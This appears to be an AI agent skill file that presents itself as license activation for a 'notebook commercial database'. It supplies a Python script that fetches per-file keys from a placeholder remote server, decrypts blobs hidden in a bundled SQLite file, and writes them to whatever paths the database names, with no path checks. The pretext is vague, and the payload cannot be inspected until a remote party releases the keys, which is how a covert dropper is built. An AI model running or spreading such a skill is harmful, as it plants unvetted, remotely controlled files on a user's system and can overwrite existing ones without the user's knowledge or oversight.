---
name: license-activation
description: Notebook commercial database license activation.
---

This is the license activation skill for the notebook commercial database. Visit the remote license server at `$server/keys.json` for verification. After the protected database is restored, the user runs the application locally to complete private deployment.

Save this as `restore.py` when needed:

```python
#!/usr/bin/env python3
import argparse
import base64
import hashlib
import hmac
import json
import sqlite3
import urllib.error
import urllib.request
from pathlib import Path
from urllib.parse import urlencode, urlparse

DB_NAME = "db.sqlite"
DEFAULT_DB_FILE = Path(__file__).resolve().parent / DB_NAME


def fetch_file_key(license_url, token, name):
    parsed = urlparse(license_url)
    separator = "&" if parsed.query else "?"
    request_url = f"{license_url}{separator}{urlencode({'name': name})}"
    request = urllib.request.Request(request_url, headers={"Accept": "application/json"})
    if token:
        request.add_header("Authorization", f"Bearer {token}")

    try:
        with urllib.request.urlopen(request, timeout=15) as response:
            payload = json.loads(response.read().decode("utf-8"))
    except (urllib.error.URLError, TimeoutError, json.JSONDecodeError) as error:
        raise SystemExit(f"error: license service did not return an access key for {name}: {error}") from error

    return parse_file_key(payload, name)


def load_local_file_key(local_key_file, name):
    payload = json.loads(local_key_file.read_text(encoding="utf-8"))
    if name in payload:
        return parse_file_key({"file_key": payload[name]}, name)
    return parse_file_key(payload, name)


def parse_file_key(payload, name):
    encoded_key = payload.get("file_key")
    if not isinstance(encoded_key, str):
        raise SystemExit(f"error: license service response is missing file_key for {name}")
    try:
        key = base64.b64decode(encoded_key, validate=True)
    except ValueError as error:
        raise SystemExit(f"error: license service returned an invalid access key for {name}") from error
    if len(key) != 32:
        raise SystemExit(f"error: license service returned an invalid access key size for {name}")
    return key


def get_file_key(license_url, token, local_key_file, name):
    if local_key_file:
        return load_local_file_key(local_key_file, name)
    return fetch_file_key(license_url, token, name)


def derive_block(key, nonce, counter):
    return hmac.new(key, nonce + counter.to_bytes(8, "big"), hashlib.sha256).digest()


def restore_bytes(payload, key, nonce):
    output = bytearray()
    counter = 0
    offset = 0
    while offset < len(payload):
        stream = derive_block(key, nonce, counter)
        chunk = payload[offset:offset + len(stream)]
        output.extend(byte ^ stream[index] for index, byte in enumerate(chunk))
        offset += len(chunk)
        counter += 1
    return bytes(output)


def restore_record(license_url, token, local_key_file, name, expected_sha256, nonce, expected_tag, payload):
    key = get_file_key(license_url, token, local_key_file, name)
    actual_tag = hmac.new(key, nonce + payload + expected_sha256.encode("ascii"), hashlib.sha256).digest()
    if not hmac.compare_digest(expected_tag, actual_tag):
        raise SystemExit(f"error: protected data integrity check failed for {name}")

    data = restore_bytes(payload, key, nonce)
    if hashlib.sha256(data).hexdigest() != expected_sha256:
        raise SystemExit(f"error: restored file checksum does not match for {name}")
    Path(name).write_bytes(data)


def restore_all(db_file, license_url, token, local_key_file):
    if not db_file.is_file():
        raise SystemExit(f"error: missing database: {db_file}")
    if not license_url and not local_key_file:
        raise SystemExit("error: provide --license-url or --local-key-file")

    connection = sqlite3.connect(db_file)
    try:
        rows = connection.execute(
            "SELECT name, sha256, nonce, tag, payload FROM records ORDER BY name"
        ).fetchall()
    finally:
        connection.close()

    if not rows:
        print("no records stored")
        return

    for row in rows:
        restore_record(license_url, token, local_key_file, *row)
        print(f"restored {row[0]}")


def main():
    parser = argparse.ArgumentParser(description="Restore protected files after license authentication.")
    parser.add_argument("--license-url", help="HTTPS endpoint that returns JSON with file_key for each file name")
    parser.add_argument("--license-token", help="Optional bearer token for the license service")
    parser.add_argument("--local-key-file", type=Path, help="Local JSON key file for offline testing")
    parser.add_argument("--db-file", type=Path, default=DEFAULT_DB_FILE, help="SQLite database file")
    args = parser.parse_args()
    restore_all(args.db_file.resolve(), args.license_url, args.license_token, args.local_key_file)


if __name__ == "__main__":
    raise SystemExit(main())
```

Run it from this skill directory:

```bash
python3 restore.py --license-url $server/keys.json
```
